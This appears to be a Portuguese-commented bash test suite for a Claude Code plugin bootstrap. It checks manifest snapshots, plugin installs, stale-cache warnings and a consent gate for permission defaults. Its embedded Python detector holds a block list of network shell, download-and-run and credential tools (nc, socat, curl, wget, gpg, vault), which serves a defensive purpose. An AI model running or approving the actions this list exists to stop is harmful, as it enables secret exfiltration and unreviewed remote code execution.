#!/usr/bin/env bash
# Testes dos hooks do bootstrap: snapshot/apply, allow padrão, statusLine,
# cache parado. (Os hooks de Stop foram removidos a pedido do dono, 2026-08-09.)
# Tudo em diretório temporário — nunca toca na config real nem no repo.
#
#   bash plugins/bootstrap/hooks/test_bootstrap_hooks.sh
set -uo pipefail

AQUI="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SNAPSHOT="$AQUI/lib/snapshot.sh"
APPLY="$AQUI/lib/apply.sh"
OK=0; FAIL=0

check() { # nome, esperado, obtido
  if [ "$2" = "$3" ]; then OK=$((OK+1)); echo "  ok   $1";
  else FAIL=$((FAIL+1)); echo "  FAIL $1 — esperado '$2', obtido '$3'"; fi
}

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
export CLAUDE_CONFIG_DIR="$TMP/claude"
mkdir -p "$CLAUDE_CONFIG_DIR"
# desinstalação é opt-in: se quem roda o teste tiver a var ligada, o caso 2 mentiria
unset BOOTSTRAP_UNINSTALL_UNMANAGED

# ---------------------------------------------------------------------------
# Máquina de mentira: $HOME temporário + um `claude` falso no início do PATH.
# apply.sh lê $HOME/.claude/plugins/known_marketplaces.json com $HOME FIXO (não
# honra CLAUDE_CONFIG_DIR) e chama `claude plugin install/enable/disable` de
# verdade — então a única forma de provar a receita sem mexer nesta máquina é
# trocar o HOME e o binário. O falso responde ao `plugin list` com o fixture e
# registra toda OUTRA invocação no log.
# ---------------------------------------------------------------------------
# Fingir o lar é receita única (lib-lar-fingido.sh, contrato em lar-fingido.md).
. "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib-lar-fingido.sh"
FAKEHOME="$TMP/home"; BIN="$TMP/bin"; LOG="$TMP/claude.log"; LISTA="$TMP/plugin-list.txt"
mkdir -p "$FAKEHOME/.claude/plugins" "$BIN"
: > "$LOG"

cat > "$FAKEHOME/.claude/plugins/known_marketplaces.json" <<'JSON'
{
  "claude-plugins-official": {"source": {"source": "github", "repo": "anthropics/claude-plugins-official"}},
  "ponytail": {"source": {"source": "git", "url": "https://github.com/DietrichGebert/ponytail.git"}}
}
JSON

# formato exato que o awk do apply/snapshot espera. terceiro-fantasma está num
# marketplace GERENCIADO e fora do manifest — é candidato a uninstall.
cat > "$LISTA" <<'TXT'
Installed plugins:
  ❯ bootstrap@pedro-plugins
    Version: 1.8.0
    Scope: user
    Status: ✔ enabled
  ❯ terceiro-fantasma@claude-plugins-official
    Version: 0.1.0
    Scope: user
    Status: ✔ enabled
TXT

cat > "$BIN/claude" <<'SH'
#!/usr/bin/env bash
if [ "${1:-}" = "plugin" ] && [ "${2:-}" = "list" ]; then
  cat "$FAKE_LIST"; exit 0
fi
echo "$*" >> "$FAKE_LOG"
exit 0
SH
chmod +x "$BIN/claude"

# roda um script do bootstrap contra a máquina de mentira
na_maquina_falsa() { # repo, script
  local repo="$1"; shift
  lar_fingido "$FAKEHOME" env PATH="$BIN:$PATH" FAKE_LIST="$LISTA" FAKE_LOG="$LOG" \
    PEDRO_PLUGINS_REPO="$repo" bash "$@"
}

echo "-- snapshot preserva chave mantida a mao"
if command -v jq >/dev/null 2>&1; then
  # sem .git o snapshot sai em silêncio na linha 27 e o caso passaria vazio
  REPO="$TMP/repo-chave"; mkdir -p "$REPO/plugins/bootstrap/config" "$REPO/.git"
  MF="$REPO/plugins/bootstrap/config/manifest.json"
  cat > "$MF" <<'JSON'
{"version":1,"description":"x","marketplaces":[],
 "skills":{"permitidas":["a"]},
 "chave_que_ninguem_conhece":{"fica":true}}
JSON
  na_maquina_falsa "$REPO" "$SNAPSHOT" >/dev/null 2>&1
  check "chave arbitraria sobrevive ao snapshot" "true" \
    "$(jq -r 'has("chave_que_ninguem_conhece")' "$MF")"
  check "skills sobrevive ao snapshot" "true" "$(jq -r 'has("skills")' "$MF")"
else
  echo "  skip  snapshot (jq ausente)"
fi

echo "-- apply.sh entrega a receita e nao desinstala nada"
if command -v jq >/dev/null 2>&1; then
  # o repo de mentira carrega o manifest REAL — é ele que está sendo provado
  REPO3="$TMP/repo"; mkdir -p "$REPO3/plugins/bootstrap/config" "$REPO3/.git"
  MF3="$REPO3/plugins/bootstrap/config/manifest.json"
  cp "$AQUI/../config/manifest.json" "$MF3"

  # SEM a flag o apply NAO instala nada novo (e o que o hook de SessionStart roda):
  # so lista o que esta pendente. A instalacao exige --install-new, pedido pelo /bootstrap.
  na_maquina_falsa "$REPO3" "$APPLY" > "$TMP/apply-semflag.out" 2>&1
  check "sem --install-new nenhum plugin install no log" 0 "$(grep -c '^plugin install' "$LOG")"
  check "sem --install-new nenhum marketplace add no log" 0 "$(grep -c '^plugin marketplace add' "$LOG")"
  check "sem --install-new a saida lista o marketplace pendente" 1 \
    "$(grep -c 'pendente: marketplace pedro-plugins ' "$TMP/apply-semflag.out")"
  check "sem --install-new a saida lista um plugin pendente" 1 \
    "$(grep -c 'pendente: plugin visual@pedro-plugins' "$TMP/apply-semflag.out")"
  : > "$LOG"

  na_maquina_falsa "$REPO3" "$APPLY" --install-new > "$TMP/apply.out" 2>&1
  ESPERADO_INSTALL="$(jq -r '[.marketplaces[] | select(.name=="pedro-plugins") | .plugins[]] | length - 1' "$MF3")"
  check "maquina so com bootstrap instala o resto do pedro-plugins" "$ESPERADO_INSTALL" \
    "$(grep -c '^plugin install .*@pedro-plugins$' "$LOG")"
  check "o marketplace proprio entra pela URL do manifest" 1 \
    "$(grep -c '^plugin marketplace add https://github.com/pedroberaldo87/pedro-plugins.git$' "$LOG")"
  # candidato reconhecido (senao o caso seguinte passaria vazio) e nao removido
  check "terceiro fora do manifest e apenas reportado" 1 \
    "$(grep -c 'DESLIGADA.*terceiro-fantasma@claude-plugins-official' "$TMP/apply.out")"
  check "nenhum uninstall no log" 0 "$(grep -c '^plugin uninstall' "$LOG")"
else
  echo "  skip  apply (jq ausente)"
fi

echo "-- round-trip: o snapshot devolve o manifest inteiro"
if command -v jq >/dev/null 2>&1; then
  SNAP1="$(na_maquina_falsa "$REPO3" "$SNAPSHOT" 2>/dev/null)"
  SNAP2="$(na_maquina_falsa "$REPO3" "$SNAPSHOT" 2>/dev/null)"
  MKT='.marketplaces[] | select(.name=="pedro-plugins")'
  # o numero sai do proprio manifest de origem: plugin novo nao pode reprovar aqui
  ESPERADO_PLUGINS="$(jq "[$MKT | .plugins[]] | length" "$AQUI/../config/manifest.json")"
  check "1a rodada reescreve" "changed" "$SNAP1"
  check "pedro-plugins continua com $ESPERADO_PLUGINS plugins" "$ESPERADO_PLUGINS" \
    "$(jq "[$MKT | .plugins[]] | length" "$MF3")"
  # O que se afere é a PRESERVAÇÃO do estado, não um valor específico: o esperado sai
  # do próprio manifest, do mesmo jeito que a contagem acima. Enquanto era "false"
  # cravado, religar um plugin no manifest deixava esta suíte vermelha por decisão do
  # dono — e teste que reprova decisão legítima ensina a ignorar teste.
  for PLUGIN in graphify-guard intent-guard project-skills vistoria; do
    ESPERADO_ON="$(jq -r "$MKT | .plugins[] | select(.name==\"$PLUGIN\") | .enabled" \
      "$AQUI/../config/manifest.json")"
    [ "$ESPERADO_ON" = "null" ] && continue
    check "$PLUGIN preserva enabled=$ESPERADO_ON" "$ESPERADO_ON" \
      "$(jq -r "$MKT | .plugins[] | select(.name==\"$PLUGIN\") | .enabled" "$MF3")"
  done
  check "2a rodada e idempotente" "unchanged" "$SNAP2"
else
  echo "  skip  round-trip (jq ausente)"
fi

# ---------------------------------------------------------------------------
# O allow padrão é o que o setup LIGA na máquina de quem instala. O snapshot da
# config regenera esse arquivo a partir da máquina de quem roda, então entrada
# que age em serviço REMOTO (com o token já guardado) ou que casa por PREFIXO
# (`source`, atribuicao de variável) volta calada no próximo re-snapshot. Este
# caso é o cobrador dessa regressão — sem ele, nada segura a volta.
# ---------------------------------------------------------------------------
echo "-- allow padrao nao aprova o que age fora da maquina"

allow_proibidas() { # [lista-json] -> entradas proibidas do allow (o arquivo de defaults se nao vier lista)
  python3 - "$AQUI/../config/settings-defaults.json" "${1:-}" <<'PY'
import json, re, sys
allow = json.loads(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2] \
    else json.load(open(sys.argv[1]))["permissions"]["allow"]
# a CLASSE que o SKILL.md recusa, nao a lista das entradas ja removidas: uma
# entrada nova da mesma familia (deploy.sh, curl, vercel) tem que reprovar igual.
familia = "|".join([
    # publica ou entrega o que esta nesta maquina
    r"scp|rsync|sftp|ftp|rclone",
    r"deploy[\w.-]*|publish[\w.-]*|release[\w.-]*|ship[\w.-]*",
    r"vercel|netlify|heroku|fly|flyctl|railway|firebase|serverless|sls|wrangler",
    r"kubectl|helm|terraform|ansible[\w-]*|pm2|eb",
    # fala com servico remoto com o token ja guardado
    r"gh|glab|npm|pnpm|yarn|psql|mysql|mongo[\w-]*|redis-cli|sqlcmd",
    r"aws|az|gcloud|doctl|supabase|stripe|pscale|planetscale|turso|twine",
    r"ssh|telnet|nc|ncat|socat",
    # executa codigo baixado na hora
    r"npx|pnpx|bunx|curl|wget",
    # grava ou le credencial
    r"ssh-add|ssh-keygen|security|keychain|gpg|pass|op|vault",
    # INTERPRETE: roda qualquer coisa, inclusive o cliente HTTP dele proprio.
    # So passa quando o caminho do script esta preso ao cache do marketplace
    # (ver `preso` abaixo). Sem isso `python3 -c`, `node -e`, `perl -e` leem
    # segredo local e mandam para fora sem pedir aprovacao.
    r"python[\d.]*|node|nodejs|bun|deno|perl|ruby|php|lua|osascript|pwsh|powershell",
    # INTERPRETE DE SHELL e avaliacao dinamica
    r"sh|bash|zsh|dash|ksh|fish|eval|exec|source",
    # EMBRULHO: roda o argumento como comando (a rede de seguranca dele some)
    r"env|printenv|xargs|timeout|time|nice|nohup|stdbuf|command|builtin|watch|setsid|ionice|flock|sudo|doas|find|sed|awk|gawk|mawk",
])
# aceita caminho antes do comando: ./deploy.sh e bin/deploy.sh sao o mesmo caso
remoto = r"^Bash\(\s*(?:[^)\s]*/)?(?:" + familia + r")\b"
# forma de duas palavras: o comando so sai da maquina no subcomando
remoto_sub = r"^Bash\(\s*(git push|docker (push|login)|gem push|cargo publish|gcloud auth|aws configure)\b"
# casa por PREFIXO: aprova qualquer comando escrito depois
prefixo = (r"^Bash\(\s*(source|\.)[* ]"
           r"|^Bash\(\s*[A-Za-z_][A-Za-z0-9_]*="
           # curinga de nome de variavel: Bash(SUPABASE_*) aprova SUPABASE_X=1 <comando>
           r"|^Bash\(\s*[A-Za-z_][A-Za-z0-9_]*_\*")
# rede aberta e execucao de codigo no navegador: sem restricao de destino, sao
# o canal de saida. `WebFetch(domain:x)` com dominio fixo e outra coisa.
ferramenta = (r"^WebFetch$|^WebFetch\(\*?\)$|^WebFetch\(domain:\*\)$"
              r"|^mcp__plugin_playwright_playwright__browser_(?:evaluate|run_code|file_upload)$"
              r"|^Bash$|^Bash\(\*\)$")
# UNICA excecao: interprete com UM script preso ao cache do proprio marketplace, na
# versao resolvida, com o curinga so nos argumentos. Pasta inteira (`.../pedro-plugins/*`)
# NAO passa: liberava todo script de todo plugin, inclusive os que executam o comando que
# recebem (precheck_largada.py --suite). Os defaults nem trazem essa forma: as regras por
# script nascem no apply-config, a partir de config/plugin-scripts.json.
preso = re.compile(r'^Bash\((?:python3|node) "?[^*"]+/plugins/cache/pedro-plugins/[^*"/]+/[^*"/]+/[^*"]+\.(?:py|mjs|js)"? \*\)$')
def proibida(x):
    if preso.match(x):
        return False
    return bool(re.search(remoto, x) or re.search(remoto_sub, x)
                or re.search(prefixo, x) or re.search(ferramenta, x))
achadas = sorted(x for x in allow if proibida(x))
if achadas:
    print("\n".join(achadas))
PY
}
check "nenhum comando remoto, interprete solto, embrulho, WebFetch ou JS de navegador no allow padrao" "" "$(allow_proibidas | tr '\n' ' ')"

# o proprio cobrador precisa reprovar a classe, senao o caso acima passa vazio
CLASSE='["Bash(python3*)","Bash(python*)","Bash(node*)","Bash(perl*)","Bash(bun*)","Bash(env*)","Bash(printenv*)","Bash(xargs*)","Bash(timeout*)","Bash(find*)","Bash(sed*)","Bash(awk*)","Bash(bash *)","Bash(curl *)","WebFetch","mcp__plugin_playwright_playwright__browser_run_code","mcp__plugin_playwright_playwright__browser_evaluate","mcp__plugin_playwright_playwright__browser_file_upload","Bash(python3 /tmp/*)","Bash(python3 {{CLAUDE_DIR}}/plugins/cache/outro-mkt/*)","Bash(python3 {{CLAUDE_DIR}}/plugins/cache/pedro-plugins/*)"]'
check "o cobrador reprova interprete, embrulho, rede aberta e JS de navegador" "21" \
  "$(printf '%s' "$CLASSE" | python3 -c 'import json,sys; print(len(json.load(sys.stdin)))')"
REPROVADAS="$(allow_proibidas "$CLASSE" | grep -c .)"
check "todas as 21 da classe reprovam no cobrador (a regra de pasta inteira entre elas)" "21" "$REPROVADAS"
check "interprete preso a UM script do cache passa" "" \
  "$(allow_proibidas '["Bash(python3 /c/plugins/cache/pedro-plugins/p/1.0/lib/x.py *)","Bash(python3 \"/c/plugins/cache/pedro-plugins/p/1.0/lib/x.py\" *)","Bash(node /c/plugins/cache/pedro-plugins/p/1.0/a/b.mjs *)"]' | tr '\n' ' ')"
check "o cobrador reprova o allow gerado que nao esteja preso a um script" "3" \
  "$(allow_proibidas '["Bash(python3 /c/plugins/cache/pedro-plugins/p/*/lib/x.py *)","Bash(python3 /c/plugins/cache/pedro-plugins/p/1.0/lib/*)","Bash(python3 /c/plugins/cache/pedro-plugins/p/1.0/lib/x.py)"]' | grep -c .)"

# Plantar um script no cache o deixaria liberado: a escrita ali tem que pedir aprovacao
regras_de_guarda() { # -> o que falta no ask para o cache valer
  python3 - "$AQUI/../config/settings-defaults.json" <<'PY'
import json, sys
p = json.load(open(sys.argv[1]))["permissions"]
ask = set(p.get("ask") or [])
falta = []
if "Edit(/{{CLAUDE_DIR}}/plugins/cache/**)" not in ask:
    falta.append("Edit(cache)")
# nenhuma regra de interprete nos defaults: elas nascem por script, no apply-config
for x in p["allow"] + list(ask):
    if x.startswith(("Bash(python3", "Bash(node")):
        falta.append("regra-de-interprete-no-arquivo:" + x)
print(" ".join(falta))
PY
}
check "o cache e protegido contra escrita e os defaults nao trazem regra de interprete" "" "$(regras_de_guarda)"

# ---------------------------------------------------------------------------
# A cadeia da statusLine é uma FILA, e a receita é o único lugar onde ela existe
# escrita. Elo que sai da receita não dá erro em lugar nenhum: a barra continua
# desenhando bonito e só o dado dele some — que é o defeito que
# `conformance.py:check_statusline_meio_ligada` persegue na máquina, e este caso
# persegue no repositório.
# ---------------------------------------------------------------------------
echo "-- a receita liga a cadeia inteira da statusLine"

elos_faltando() { # -> os elos que a receita NAO cita
  python3 - "$AQUI/../config/settings-defaults.json" <<'PY'
import json, sys
fwd = (json.load(open(sys.argv[1]))["env"] or {}).get("CLAUDE_STATUSLINE_FORWARD", "")
print(" ".join(m for m in ("statusline-motor", "claude-hud") if m not in fwd))
PY
}
check "a receita cita o narrador do motor e o renderizador" "" "$(elos_faltando)"

# ── O AVISO DE CACHE PARADO ───────────────────────────────────────────────────
# O cache é chaveado por versão e o repositório exige bump em toda mudança: cada
# instalação deixa a pasta anterior no disco, para sempre. Em 2026-08-08 isso fez
# uma skill movida de plugin continuar respondendo pela versão velha — o repo estava
# certo e a máquina rodava a errada, porque a errada era a mais alta do disco.
echo
echo "-- o aviso de cache parado"

CACHE_LIB="$AQUI/lib/cache-parado.sh"
POST="$AQUI/post-plugin-command.sh"

# um cache de mentira: alfa com 3 versões (2 paradas), beta com 1 (nenhuma parada)
FALSO="$TMP/cache-falso"
mkdir -p "$FALSO/plugins/cache/mkt/alfa/1.0.0" \
         "$FALSO/plugins/cache/mkt/alfa/1.9.0" \
         "$FALSO/plugins/cache/mkt/alfa/1.10.0" \
         "$FALSO/plugins/cache/mkt/beta/2.0.0"
# `.in_use` não é versão: se entrasse na conta, seria apagado junto
: > "$FALSO/plugins/cache/mkt/alfa/.in_use"

conta_falso() { CLAUDE_CONFIG_DIR="$FALSO" bash -c ". \"$CACHE_LIB\"; cp_total"; }
check "conta as paradas, e 1.10 e mais alta que 1.9" "2" "$(conta_falso)"

lista_falso() { CLAUDE_CONFIG_DIR="$FALSO" bash -c ". \"$CACHE_LIB\"; cp_parados" | wc -l | tr -d " "; }
check "plugin com uma versao so nao entra na lista" "1" "$(lista_falso)"

roda_post() { # comando, env extra
  printf '{"tool_input":{"command":"%s"}}' "$1" |
    env $2 CLAUDE_CONFIG_DIR="$FALSO" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
    bash "$POST" 2>/dev/null | grep -c systemMessage | tr -d " "
}
check "update avisa — e update NAO estava no match antigo" "1" "$(roda_post 'claude plugin update x@y' '')"
check "install avisa"                       "1" "$(roda_post 'claude plugin install x@y' '')"
check "comando que nao e de plugin cala"    "0" "$(roda_post 'git status' '')"
check "kill-switch desliga"                 "0" "$(roda_post 'claude plugin update x@y' 'PEDRO_CACHE_AVISO=0')"

# o exit por repo-fonte ausente matava o aviso: o cache incha em QUALQUER máquina
check "avisa mesmo sem o repositorio de origem no disco" "1" \
  "$(roda_post 'claude plugin update x@y' 'PEDRO_PLUGINS_REPO=/nao/existe')"

# cache limpo não inventa aviso
LIMPO="$TMP/cache-limpo"; mkdir -p "$LIMPO/plugins/cache/mkt/solo/1.0.0"
check "cache sem sobra nao avisa" "0" \
  "$(printf '{"tool_input":{"command":"claude plugin update x@y"}}' |
     CLAUDE_CONFIG_DIR="$LIMPO" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$POST" 2>/dev/null |
     grep -c systemMessage | tr -d ' ')"

# APAGAR: só a mais alta sobrevive, e o `.in_use` não é tocado
CLAUDE_CONFIG_DIR="$FALSO" bash -c ". \"$CACHE_LIB\"; cp_limpar" >/dev/null 2>&1
check "depois de limpar, sobra so a versao mais alta" "1.10.0" \
  "$(ls "$FALSO/plugins/cache/mkt/alfa" | grep -v '^\.' | tr '\n' ' ' | xargs)"
check "o .in_use sobreviveu a limpeza" "0" \
  "$([ -f "$FALSO/plugins/cache/mkt/alfa/.in_use" ] && echo 0 || echo 1)"
check "nada a limpar depois da limpeza" "0" "$(conta_falso)"


# O `/plugin` é comando do PRÓPRIO Claude Code: não passa pela ferramenta de shell,
# então nenhum PostToolUse acorda com ele — e é por ali que o cache mais incha. Por
# isso o aviso também mora na abertura de sessão, com relógio próprio de 1×/dia.
SESSAO="$AQUI/session-sync.sh"
CT="$TMP/ct-inchado"
mkdir -p "$CT/plugins/cache/mkt/alfa/1.0.0" "$CT/plugins/cache/mkt/alfa/1.9.0" \
         "$CT/plugins/cache/mkt/alfa/1.10.0"

roda_sessao() { # config-dir, env extra
  env $2 CLAUDE_CONFIG_DIR="$1" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
    bash "$SESSAO" 2>/dev/null | grep -c systemMessage | tr -d " "
}
check "a abertura de sessao avisa o cache parado" "1" "$(roda_sessao "$CT" '')"
check "no mesmo dia ela cala (relogio proprio)"   "0" "$(roda_sessao "$CT" '')"

CL="$TMP/ct-limpo"; mkdir -p "$CL/plugins/cache/mkt/solo/1.0.0"
check "cache limpo nao inventa aviso na sessao"   "0" "$(roda_sessao "$CL" '')"

CK="$TMP/ct-kill"; mkdir -p "$CK/plugins/cache/mkt/a/1.0.0" "$CK/plugins/cache/mkt/a/2.0.0"
check "kill-switch desliga o aviso da sessao"     "0" "$(roda_sessao "$CK" 'PEDRO_CACHE_AVISO=0')"


# ── O RELOGIO DA BARRA ────────────────────────────────────────────────────────
# Quem redesenha a barra e o harness, e por padrao so em evento: com o trabalho
# em segundo plano e ninguem digitando, a linha do motor congela no valor da
# ultima tecla. A receita tem que pedir o redesenho por tempo.
echo "-- a receita pede o redesenho por tempo"

CONF="$TMP/ct-statusline"
mkdir -p "$CONF/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
: > "$CONF/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks/context-guard-writer.sh"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
env CLAUDE_CONFIG_DIR="$CONF" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
  bash "$AQUI/lib/apply-config.sh" >/dev/null 2>&1
check "a statusLine nasce com refreshInterval" "10" \
  "$(python3 -c "import json,sys; print((json.load(open(sys.argv[1])).get('statusLine') or {}).get('refreshInterval'))" \
     "$CONF/settings.json" 2>/dev/null)"

# ── O CONSENTIMENTO DAS PERMISSÕES (Artigo 2) ───────────────────────────────
# Default de risco não nasce ligado: sem a marca de consentimento, o merge das
# permissões não roda; com ela, o allow inteiro dos defaults entra por union.
echo "-- permissões só entram com a marca de consentimento"

CP="$TMP/ct-consent"
mkdir -p "$CP/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
: > "$CP/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks/context-guard-writer.sh"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
env CLAUDE_CONFIG_DIR="$CP" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
  bash "$AQUI/lib/apply-config.sh" >/dev/null 2>&1
check "sem a marca, o allow não é aplicado" "0" \
  "$(python3 -c "import json,sys; p=json.load(open(sys.argv[1])).get('permissions') or {}; print(len(p.get('allow') or []))" \
     "$CP/settings.json" 2>/dev/null)"
ESPERADO="$(python3 -c "import json,sys; print(len(json.load(open(sys.argv[1]))['permissions']['allow']))" "$AQUI/../config/settings-defaults.json")"
env CLAUDE_CONFIG_DIR="$CP" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
  bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
env CLAUDE_CONFIG_DIR="$CP" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
  bash "$AQUI/lib/apply-config.sh" >/dev/null 2>&1
check "com a marca, o allow dos defaults entra inteiro" "$ESPERADO" \
  "$(python3 -c "import json,sys; print(len(json.load(open(sys.argv[1]))['permissions']['allow']))" \
     "$CP/settings.json" 2>/dev/null)"

# ── SEM ANISTIA: um texto solto no settings não vale como consentimento ───────
# O apply-config gravava a marca sozinho quando o settings tinha o nome de UMA
# ferramenta do Playwright em qualquer lugar do arquivo (até num ask ou num deny).
# A marca é o "sim" do usuário; só o /bootstrap a grava.
echo "-- um texto solto no settings.json não vira consentimento"

CA="$TMP/ct-anistia"
mkdir -p "$CA/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
: > "$CA/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks/context-guard-writer.sh"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
cat > "$CA/settings.json" <<'JSON'
{"permissions": {"deny": ["mcp__plugin_playwright_playwright__browser_navigate"], "allow": ["Bash(ls*)"]}}
JSON
env CLAUDE_CONFIG_DIR="$CA" CLAUDE_PLUGIN_ROOT="$AQUI/.." \
  bash "$AQUI/lib/apply-config.sh" > "$TMP/anistia.out" 2>&1
check "o nome do Playwright no deny não grava a marca" "0" \
  "$([ -f "$CA/pedro-plugins-permissions-ok" ] && echo 1 || echo 0)"
check "o allow do usuário segue só com a entrada dele" "Bash(ls*)" \
  "$(python3 -c "import json,sys; print(','.join(json.load(open(sys.argv[1]))['permissions']['allow']))" "$CA/settings.json")"
check "a saída diz que falta o consentimento" "1" "$(grep -c 'NÃO aplicadas' "$TMP/anistia.out")"

# settings que já tem o allow dos defaults, sem marca: também espera o "sim"
CB="$TMP/ct-ja-mesclado"
mkdir -p "$CB/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
: > "$CB/plugins/cache/pedro-plugins/context-guard/9.9.9/hooks/context-guard-writer.sh"  # acopla-ok: fixture do caminho que o proprio apply-config.sh resolve
cat > "$CB/settings.json" <<'JSON'
{"permissions": {"allow": ["mcp__plugin_playwright_playwright__browser_navigate", "mcp__plugin_playwright_playwright__browser_click"]}}
JSON
env CLAUDE_CONFIG_DIR="$CB" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" >/dev/null 2>&1
check "settings já mesclado, sem marca: nada de anistia" "0" \
  "$([ -f "$CB/pedro-plugins-permissions-ok" ] && echo 1 || echo 0)"

# ── O QUE O MERGE VAI ACRESCENTAR É MOSTRADO ANTES ────────────────────────────
echo "-- o apply-config lista as entradas antes de mesclar e resolve o caminho do cache"

CL2="$TMP/ct-lista"; mkdir -p "$CL2" "$CL2/plugins/cache/pedro-plugins/2op/1.2.3/lib" "$CL2/plugins/cache/pedro-plugins/2op/1.0.0/lib"
cp "$AQUI/../../2op/lib/quem_serviu.py" "$CL2/plugins/cache/pedro-plugins/2op/1.2.3/lib/quem_serviu.py"
cp "$AQUI/../../2op/lib/quem_serviu.py" "$CL2/plugins/cache/pedro-plugins/2op/1.0.0/lib/quem_serviu.py"
# O caminho como o PYTHON o enxerga: no Windows o git-bash converte o argumento solto
# (/tmp/x vira C:\\...) antes de entregá-lo, e é essa forma que o apply-config grava.
CLP="$(python3 -c 'import sys; print(sys.argv[1])' "$CL2")"
LISTA_OUT="$(env CLAUDE_CONFIG_DIR="$CL2" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --listar 2>&1)"
check "--listar não escreve settings.json" "0" "$([ -f "$CL2/settings.json" ] && echo 1 || echo 0)"
check "--listar não grava a marca" "0" "$([ -f "$CL2/pedro-plugins-permissions-ok" ] && echo 1 || echo 0)"
check "--listar mostra a regra do script, na versão mais alta, com o caminho desta máquina" "1" \
  "$(printf '%s\n' "$LISTA_OUT" | grep -cF "allow + Bash(python3 $CLP/plugins/cache/pedro-plugins/2op/1.2.3/lib/quem_serviu.py *)")"
check "--listar mostra a mesma regra com o caminho entre aspas" "1" \
  "$(printf '%s\n' "$LISTA_OUT" | grep -cF "allow + Bash(python3 \"$CLP/plugins/cache/pedro-plugins/2op/1.2.3/lib/quem_serviu.py\" *)")"
check "--listar não dá regra à versão antiga" "0" "$(printf '%s\n' "$LISTA_OUT" | grep -cF "2op/1.0.0/")"
check "--listar não dá regra a script que executa comando (precheck_largada.py)" "0" \
  "$(printf '%s\n' "$LISTA_OUT" | grep '^allow + ' | grep -c 'precheck_largada')"
check "--listar mostra o ask do executor, que vence um allow largo antigo" "1" \
  "$(printf '%s\n' "$LISTA_OUT" | grep -cF "ask + Bash(*$CLP/plugins/cache/pedro-plugins/project-skills/*/lib/precheck_largada.py*)")"
check "--listar não deixa {{CLAUDE_DIR}} sem resolver" "0" "$(printf '%s\n' "$LISTA_OUT" | grep -c '{{CLAUDE_DIR}}')"
check "--listar conta o que entra" "1" "$(printf '%s\n' "$LISTA_OUT" | grep -c 'entradas novas')"

env CLAUDE_CONFIG_DIR="$CL2" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
MERGE_OUT="$(env CLAUDE_CONFIG_DIR="$CL2" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" 2>&1)"
check "com a marca, o merge imprime as entradas que acrescentou" "1" \
  "$(printf '%s\n' "$MERGE_OUT" | grep -cF "allow + Bash(python3 $CLP/plugins/cache/pedro-plugins/2op/1.2.3/lib/quem_serviu.py *)")"
check "o settings final tem a regra do script no caminho real" "1" \
  "$(python3 -c "import json,sys; a=json.load(open(sys.argv[1]))['permissions']['allow']; print(sum(1 for x in a if x==sys.argv[2]))" \
     "$CL2/settings.json" "Bash(python3 $CLP/plugins/cache/pedro-plugins/2op/1.2.3/lib/quem_serviu.py *)")"
check "o settings final nao tem regra de pasta inteira" "0" \
  "$(python3 -c "import json,sys; a=json.load(open(sys.argv[1]))['permissions']['allow']; print(sum(1 for x in a if x.endswith('/pedro-plugins/*)')))" "$CL2/settings.json")"
check "o settings final tem o ask de escrita no cache" "1" \
  "$(python3 -c "import json,sys; a=json.load(open(sys.argv[1]))['permissions'].get('ask',[]); print(sum(1 for x in a if x==sys.argv[2]))" \
     "$CL2/settings.json" "Edit(/$CLP/plugins/cache/**)")"
check "o settings final não tem placeholder" "0" "$(grep -c '{{CLAUDE_DIR}}' "$CL2/settings.json")"

# máquina que já recebeu o allow largo: o apply AVISA e só remove com pedido explícito
CR="$TMP/ct-retiradas"; mkdir -p "$CR"
env CLAUDE_CONFIG_DIR="$CR" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --consentir >/dev/null 2>&1
cat > "$CR/settings.json" <<'JSON'
{"permissions": {"allow": ["Bash(python3*)", "Bash(node*)", "WebFetch", "Bash(env*)", "Bash(ls*)", "Bash(meu-script*)"]}}
JSON
RET_OUT="$(env CLAUDE_CONFIG_DIR="$CR" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" 2>&1)"
check "entrada larga antiga fica no allow e o apply avisa" "4" "$(printf '%s\n' "$RET_OUT" | grep -c 'retirada do padrão: ')"
check "o aviso não remove nada sozinho" "1" \
  "$(python3 -c "import json,sys; print(int('Bash(python3*)' in json.load(open(sys.argv[1]))['permissions']['allow']))" "$CR/settings.json")"
env CLAUDE_CONFIG_DIR="$CR" CLAUDE_PLUGIN_ROOT="$AQUI/.." bash "$AQUI/lib/apply-config.sh" --remover-retiradas >/dev/null 2>&1
check "--remover-retiradas tira as largas e deixa a entrada do usuario" "0 1" \
  "$(python3 -c "
import json,sys
a=json.load(open(sys.argv[1]))['permissions']['allow']
largas=['Bash(python3*)','Bash(node*)','WebFetch','Bash(env*)']
print(sum(1 for x in largas if x in a), int('Bash(meu-script*)' in a))" "$CR/settings.json")"

